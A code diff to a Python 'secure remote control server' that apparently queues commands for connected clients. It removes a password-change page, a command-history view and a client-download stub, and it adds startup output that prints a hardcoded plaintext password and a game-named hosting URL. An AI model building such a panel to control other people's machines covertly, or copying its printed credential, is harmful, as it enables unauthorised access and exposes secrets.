-                input:focus {
-                    outline: none;
-                    border-color: #0078d4;
-                    background: rgba(255,255,255,0.15);
-                }
-                button {
-                    background: linear-gradient(135deg, #0078d4, #005a9e);
-                    color: white;
-                    cursor: pointer;
-                    font-weight: bold;
-                }
-                button:hover {
-                    background: linear-gradient(135deg, #005a9e, #004578);
-                    transform: translateY(-2px);
-                }
-                .back-btn {
-                    background: linear-gradient(135deg, #6c757d, #495057);
-                    margin-top: 20px;
-                }
-                .message {
-                    padding: 12px;
-                    border-radius: 6px;
-                    margin: 10px 0;
-                    text-align: center;
-                    display: none;
-                    font-weight: bold;
-                }
-                .success {
-                    background: rgba(40, 167, 69, 0.2);
-                    border: 1px solid #28a745;
-                }
-                .error {
-                    background: rgba(220, 53, 69, 0.2);
-                    border: 1px solid #dc3545;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="header">
-                    <div class="logo">⚙️</div>
-                    <h2>Security Settings</h2>
-                    <p>Change Authentication Passwords</p>
-                </div>
-
-                <div id="message" class="message"></div>
-
-                <div class="password-form">
-                    <h3>Change Level 1 Password</h3>
-                    <input type="password" id="currentPassword1" placeholder="Current Level 1 Password">
-                    <input type="password" id="newPassword1" placeholder="New Level 1 Password">
-                    <input type="password" id="confirmPassword1" placeholder="Confirm New Password">
-                    <button onclick="changePassword('level1')">Update Level 1 Password</button>
-                </div>
-
-                <div class="password-form">
-                    <h3>Change Admin Password</h3>
-                    <input type="password" id="currentPassword2" placeholder="Current Admin Password">
-                    <input type="password" id="newPassword2" placeholder="New Admin Password">
-                    <input type="password" id="confirmPassword2" placeholder="Confirm New Password">
-                    <button onclick="changePassword('level2')">Update Admin Password</button>
-                </div>
-
-                <button class="back-btn" onclick="goBack()">← Back to Control Panel</button>
-            </div>
-
-            <script>
-                function showMessage(text, type) {
-                    const message = document.getElementById('message');
-                    message.textContent = text;
-                    message.className = 'message ' + type;
-                    message.style.display = 'block';
-                    setTimeout(() => {
-                        message.style.display = 'none';
-                    }, 3000);
-                }
-
-                async function changePassword(level) {
-                    let currentId, newId, confirmId;
-                    
-                    if (level === 'level1') {
-                        currentId = 'currentPassword1';
-                        newId = 'newPassword1';
-                        confirmId = 'confirmPassword1';
-                    } else {
-                        currentId = 'currentPassword2';
-                        newId = 'newPassword2';
-                        confirmId = 'confirmPassword2';
-                    }
-
-                    const currentPassword = document.getElementById(currentId).value;
-                    const newPassword = document.getElementById(newId).value;
-                    const confirmPassword = document.getElementById(confirmId).value;
-
-                    if (!currentPassword || !newPassword || !confirmPassword) {
-                        showMessage('Please fill all fields', 'error');
-                        return;
-                    }
-
-                    if (newPassword !== confirmPassword) {
-                        showMessage('New passwords do not match', 'error');
-                        return;
-                    }
-
-                    if (newPassword.length < 8) {
-                        showMessage('Password must be at least 8 characters', 'error');
-                        return;
-                    }
-
-                    try {
-                        const response = await fetch('/change-password', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                level: level,
-                                current_password: currentPassword,
-                                new_password: newPassword
-                            })
-                        });
-                        
-                        const data = await response.json();
-                        if (data.success) {
-                            showMessage('Password updated successfully!', 'success');
-                            document.getElementById(currentId).value = '';
-                            document.getElementById(newId).value = '';
-                            document.getElementById(confirmId).value = '';
-                        } else {
-                            showMessage(data.error || 'Failed to update password', 'error');
-                        }
-                    } catch (err) {
-                        showMessage('Network error', 'error');
-                    }
-                }
-
-                function goBack() {
-                    window.location.href = '/control';
-                }
-            </script>
-        </body>
-        </html>
-        '''
-        self.send_html(html)
-
-    def handle_change_password(self, data):
-        session = self.require_auth(2)
-        if not session:
-            return
-        
-        level = data.get('level')
-        current_password = data.get('current_password')
-        new_password = data.get('new_password')
-        
-        if not level or not current_password or not new_password:
-            self.send_json({'success': False, 'error': 'Missing required fields'})
-            return
-        
-        if len(new_password) < 8:
-            self.send_json({'success': False, 'error': 'Password must be at least 8 characters'})
-            return
-        
-        passwords = self.password_manager.load_passwords()
-        
-        if level == 'level1':
-            if not self.password_manager.verify_password(current_password, passwords['user_password']):
-                self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
-                return
-            
-            passwords['user_password'] = self.password_manager.hash_password(new_password)
-            
-        elif level == 'level2':
-            if not self.password_manager.verify_password(current_password, passwords['admin_password']):
-                self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
-                return
-            
-            passwords['admin_password'] = self.password_manager.hash_password(new_password)
-        
-        else:
-            self.send_json({'success': False, 'error': 'Invalid password level'})
-            return
-        
-        if self.password_manager.save_passwords(passwords):
-            self.log_security_event(f"Password changed for {level}", "INFO")
-            self.log_auth_event(session['user_id'], f'change_password_{level}', True)
-            self.send_json({'success': True})
-        else:
-            self.send_json({'success': False, 'error': 'Failed to save new password'})
-
-    def send_command_history(self):
-        session = self.require_auth(1)
-        if not session:
-            return
-            
-        try:
-            if hasattr(self, 'cursor'):
-                self.cursor.execute('''
-                    SELECT client_id, command, response, timestamp, status
-                    FROM commands 
-                    ORDER BY timestamp DESC 
-                    LIMIT 50
-                ''')
-                history = self.cursor.fetchall()
-                
-                result = []
-                for row in history:
-                    result.append({
-                        'client_id': row[0],
-                        'command': row[1],
-                        'response': row[2],
-                        'timestamp': row[3],
-                        'status': row[4]
-                    })
-                
-                self.send_json(result)
-            else:
-                self.send_json([])
-        except:
-            self.send_json([])
-
-    def send_system_status(self):
-        session = self.require_auth(1)
-        if not session:
-            return
-            
-        with self.session_lock:
-            status = {
-                'uptime': 'Running - Secure Mode',
-                'connected_clients': len([c for c in self.sessions.values() 
-                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 30]),
-                'active_sessions': len(self.session_manager.sessions),
-                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                'mode': 'SECURE',
-                'security_level': 'HIGH'
-            }
-            
-            if hasattr(self, 'cursor'):
-                self.cursor.execute('SELECT COUNT(*) FROM commands')
-                status['total_commands'] = self.cursor.fetchone()[0]
-                
-                self.cursor.execute('SELECT COUNT(*) FROM security_logs WHERE severity = "HIGH"')
-                status['security_alerts'] = self.cursor.fetchone()[0]
-            
-            self.send_json(status)
-
-    def download_python_client(self):
-        session = self.require_auth(2)
-        if not session:
-            return
-            
-        client_code = '''
-        # Secure Python Client Code
-        # This would be the actual client code
-        '''
-        
-        self.send_response(200)
-        self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="secure_client.py"')
-        self.end_headers()
-        self.wfile.write(client_code.encode())
-
     def send_404_page(self):
         self.send_error(404, "Page not found")
 
@@ -2049,7 +1316,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         pass
 
 def cleanup_sessions():
-    """تنظيف الجلسات المنتهية"""
     while True:
         try:
             time.sleep(300)
@@ -2070,40 +1336,23 @@ def main():
     
     threading.Thread(target=cleanup_sessions, daemon=True).start()
     
-    print("=" * 80)
-    print("  SECURE REMOTE CONTROL SERVER - ENHANCED SECURITY MODE")
-    print("=" * 80)
-    print(" Security Features:")
-    print("  • Secure Session Management")
-    print("  • BCrypt Password Hashing")
-    print("  • Rate Limiting & IP Blocking")
-    print("  • Command Validation & Sanitization")
-    print("  • CSRF Protection")
-    print("  • Security Headers")
-    print("  • Comprehensive Logging")
-    print("  • Multi-Platform Support")
-    print("=" * 80)
-    print(" Performance Features:")
-    print("  • Ultra-Fast Communication")
-    print("  • Multi-Threaded Server")
-    print("  • Real-Time Updates")
-    print("  • Windows & Linux Commands")
-    print("=" * 80)
+    print("=" * 60)
+    print("  SECURE REMOTE CONTROL SERVER")
+    print("=" * 60)
+    print("  Password: mynameishacker")
+    print("  Port: 10000")
+    print("=" * 60)
     
     try:
-        server = ThreadedHTTPServer(('0.0.0.0', 8082), EnhancedRemoteControlHandler)
-        print(" Secure server started on port 8082!")
-        print(" Access the control panel after authentication")
-        print(" Ultra-fast and fully secured")
-        print("=" * 80)
+        server = ThreadedHTTPServer(('0.0.0.0', 10000), EnhancedRemoteControlHandler)
+        print("✅ Server started on 0.0.0.0:10000")
+        print("🌐 Access URL: https://game-python-1.onrender.com")
+        print("=" * 60)
         server.serve_forever()
     except KeyboardInterrupt:
         print("\nServer stopped by user")
     except Exception as e:
         print(f"Server error: {e}")
-    finally:
-        if hasattr(handler, 'conn'):
-            handler.conn.close()
 
 if __name__ == "__main__":
     main()
